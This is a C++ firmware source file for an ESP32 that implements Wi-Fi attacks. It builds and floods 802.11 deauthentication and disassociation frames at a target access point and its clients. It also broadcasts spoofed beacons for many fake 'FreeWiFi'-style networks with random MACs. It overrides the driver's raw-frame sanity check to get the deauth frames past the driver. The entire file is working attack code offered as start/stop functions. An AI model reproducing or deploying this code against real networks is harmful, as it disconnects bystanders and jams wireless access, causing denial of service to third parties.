#include "wifi_attack.h"

#include <cstring>

#include "esp_log.h"
#include "esp_random.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "wifi_mgr.h"

static const char *TAG = "attack";

/* The esp_wifi driver rejects raw frames it did not build itself. Overriding this
   internal sanity hook (weak in the blob) lets esp_wifi_80211_tx() send deauth
   frames. Documented workaround used by RF testing firmware. */
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    return 0;
}

typedef struct {
    bool running;
    TaskHandle_t task;
    uint32_t frames;
    uint32_t pps;
    uint8_t channel;
    /* deauth */
    uint8_t bssid[6];
    uint8_t client[6];
    /* beacon */
    int beacon_count;
    char beacon_prefix[16];
} attack_ctx_t;

static attack_ctx_t s_deauth;
static attack_ctx_t s_beacon;

/* Puts the radio into a raw-TX-capable state: drop any STA link, go promiscuous. */
static void radio_grab(uint8_t channel)
{
    wifi_mgr_disconnect();
    esp_wifi_set_promiscuous(true);
    if (channel >= 1 && channel <= 14) esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

static void radio_release(void)
{
    esp_wifi_set_promiscuous(false);
}

/* ---------------- deauth ---------------- */

static const uint8_t DEAUTH_TMPL[26] = {
    0xC0, 0x00,                         /* type/subtype: deauth */
    0x00, 0x00,                         /* duration */
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, /* addr1 destination */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* addr2 source (BSSID) */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* addr3 BSSID */
    0x00, 0x00,                         /* seq */
    0x07, 0x00,                         /* reason 7: class-3 frame from nonassociated STA */
};

static void deauth_task(void *arg)
{
    auto *c = (attack_ctx_t *)arg;
    radio_grab(c->channel);

    uint8_t frame[26];
    int64_t t0 = esp_timer_get_time();
    uint32_t base = 0;
    while (c->running) {
        for (int burst = 0; burst < 16 && c->running; burst++) {
            memcpy(frame, DEAUTH_TMPL, sizeof(frame));
            memcpy(frame + 4, c->client, 6);  /* addr1 destination */
            memcpy(frame + 10, c->bssid, 6);  /* addr2 source */
            memcpy(frame + 16, c->bssid, 6);  /* addr3 BSSID */
            esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);

            frame[0] = 0xA0; /* disassoc, reason stays */
            esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
            c->frames += 2;
        }
        int64_t dt = esp_timer_get_time() - t0;
        if (dt >= 1000000) {
            c->pps = (uint32_t)((uint64_t)(c->frames - base) * 1000000 / dt);
            base = c->frames;
            t0 = esp_timer_get_time();
        }
        vTaskDelay(pdMS_TO_TICKS(1));
    }
    radio_release();
    c->task = nullptr;
    vTaskDelete(nullptr);
}

bool wifi_attack_deauth_start(const uint8_t bssid[6], uint8_t channel, const uint8_t client[6])
{
    if (s_deauth.running || s_beacon.running) return false;
    memset(&s_deauth, 0, sizeof(s_deauth));
    memcpy(s_deauth.bssid, bssid, 6);
    if (client) memcpy(s_deauth.client, client, 6);
    else memset(s_deauth.client, 0xFF, 6);
    s_deauth.channel = channel;
    s_deauth.running = true;
    if (xTaskCreatePinnedToCore(deauth_task, "deauth", 4096, &s_deauth, 5, &s_deauth.task, 0) != pdPASS) {
        s_deauth.running = false;
        return false;
    }
    ESP_LOGW(TAG, "deauth started on ch %d", channel);
    return true;
}

void wifi_attack_deauth_stop(void)
{
    s_deauth.running = false;
    while (s_deauth.task) vTaskDelay(pdMS_TO_TICKS(10));
}

bool wifi_attack_deauth_running(void) { return s_deauth.running; }

void wifi_attack_deauth_status(attack_status_t *out)
{
    out->running = s_deauth.running;
    out->frames = s_deauth.frames;
    out->pps = s_deauth.pps;
    out->channel = s_deauth.channel;
}

/* ---------------- beacon spam ---------------- */

/* 802.11 beacon header up to (and including) the fixed parameters. */
static int build_beacon(uint8_t *buf, const uint8_t bssid[6], const char *ssid, uint8_t channel)
{
    int n = 0;
    const uint8_t hdr[] = {
        0x80, 0x00,                         /* beacon */
        0x00, 0x00,                         /* duration */
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, /* addr1 broadcast */
    };
    memcpy(buf + n, hdr, sizeof(hdr)); n += sizeof(hdr);
    memcpy(buf + n, bssid, 6); n += 6; /* addr2 source */
    memcpy(buf + n, bssid, 6); n += 6; /* addr3 BSSID */
    buf[n++] = 0x00; buf[n++] = 0x00;  /* seq */

    /* fixed params: timestamp(8) + interval(2) + caps(2) */
    memset(buf + n, 0, 8); n += 8;
    buf[n++] = 0x64; buf[n++] = 0x00;  /* beacon interval 100 TU */
    buf[n++] = 0x21; buf[n++] = 0x04;  /* caps: ESS + short preamble */

    /* SSID element */
    int slen = (int)strlen(ssid);
    if (slen > 32) slen = 32;
    buf[n++] = 0x00; buf[n++] = (uint8_t)slen;
    memcpy(buf + n, ssid, slen); n += slen;

    /* supported rates */
    const uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};
    memcpy(buf + n, rates, sizeof(rates)); n += sizeof(rates);

    /* DS parameter set (channel) */
    buf[n++] = 0x03; buf[n++] = 0x01; buf[n++] = channel;
    return n;
}

static void beacon_task(void *arg)
{
    auto *c = (attack_ctx_t *)arg;
    const uint8_t channels[] = {1, 6, 11};
    int ci = 0;
    radio_grab(channels[0]);

    uint8_t frame[128];
    char ssid[33];
    int64_t t0 = esp_timer_get_time();
    uint32_t base = 0;
    while (c->running) {
        uint8_t ch = channels[ci];
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        c->channel = ch;
        for (int i = 0; i < c->beacon_count && c->running; i++) {
            uint8_t bssid[6] = {0x02, 0x00, 0x00, 0x00, 0x00, (uint8_t)i};
            esp_fill_random(bssid + 1, 4);
            bssid[0] = 0x02; /* locally administered, unicast */
            snprintf(ssid, sizeof(ssid), "%s-%02X%02X", c->beacon_prefix, bssid[4], bssid[5]);
            int len = build_beacon(frame, bssid, ssid, ch);
            esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
            c->frames++;
        }
        ci = (ci + 1) % (int)(sizeof(channels));
        int64_t dt = esp_timer_get_time() - t0;
        if (dt >= 1000000) {
            c->pps = (uint32_t)((uint64_t)(c->frames - base) * 1000000 / dt);
            base = c->frames;
            t0 = esp_timer_get_time();
        }
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    radio_release();
    c->task = nullptr;
    vTaskDelete(nullptr);
}

bool wifi_attack_beacon_start(const char *prefix, int count)
{
    if (s_deauth.running || s_beacon.running) return false;
    if (count < 1) count = 1;
    if (count > ATTACK_MAX_BEACONS) count = ATTACK_MAX_BEACONS;
    memset(&s_beacon, 0, sizeof(s_beacon));
    strncpy(s_beacon.beacon_prefix, prefix && prefix[0] ? prefix : "FreeWiFi", sizeof(s_beacon.beacon_prefix) - 1);
    s_beacon.beacon_count = count;
    s_beacon.running = true;
    if (xTaskCreatePinnedToCore(beacon_task, "beacon", 4096, &s_beacon, 5, &s_beacon.task, 0) != pdPASS) {
        s_beacon.running = false;
        return false;
    }
    ESP_LOGW(TAG, "beacon spam started, %d SSIDs", count);
    return true;
}

void wifi_attack_beacon_stop(void)
{
    s_beacon.running = false;
    while (s_beacon.task) vTaskDelay(pdMS_TO_TICKS(10));
}

bool wifi_attack_beacon_running(void) { return s_beacon.running; }

void wifi_attack_beacon_status(attack_status_t *out)
{
    out->running = s_beacon.running;
    out->frames = s_beacon.frames;
    out->pps = s_beacon.pps;
    out->channel = s_beacon.channel;
}

int wifi_attack_beacon_count(void) { return s_beacon.beacon_count; }

void wifi_attack_init(void) {}
